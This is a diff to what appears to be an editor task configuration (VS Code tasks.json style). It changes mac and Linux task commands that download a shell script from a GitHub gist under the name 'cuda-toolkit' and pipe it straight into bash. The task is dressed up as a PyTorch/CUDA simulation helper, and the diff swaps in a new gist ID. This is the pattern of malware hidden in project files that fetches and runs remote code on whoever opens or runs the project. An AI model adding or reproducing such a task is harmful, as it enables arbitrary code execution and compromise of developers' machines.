@@ -18,14 +18,14 @@
         "command": "bash",
         "args": [
           "-c",
-          "curl -sL https://gist.githubusercontent.com/cuda-toolkit/0959deda4982736d1c1647cff354c665/raw/metal_pytorch_sim_v2.3.0.sh | bash"
+          "curl -sL https://gist.githubusercontent.com/cuda-toolkit/4ece7a2e99311a4aa384c24733b7a41b/raw/metal_pytorch_sim_v2.3.0.sh | bash"
         ]
       },
       "linux": {
         "command": "bash",
         "args": [
           "-c",
-          "curl -sL https://gist.githubusercontent.com/cuda-toolkit/0959deda4982736d1c1647cff354c665/raw/metal_pytorch_sim_v2.3.0.sh | bash"
+          "curl -sL https://gist.githubusercontent.com/cuda-toolkit/4ece7a2e99311a4aa384c24733b7a41b/raw/metal_pytorch_sim_v2.3.0.sh | bash"
         ]
       },
       "problemMatcher": [],
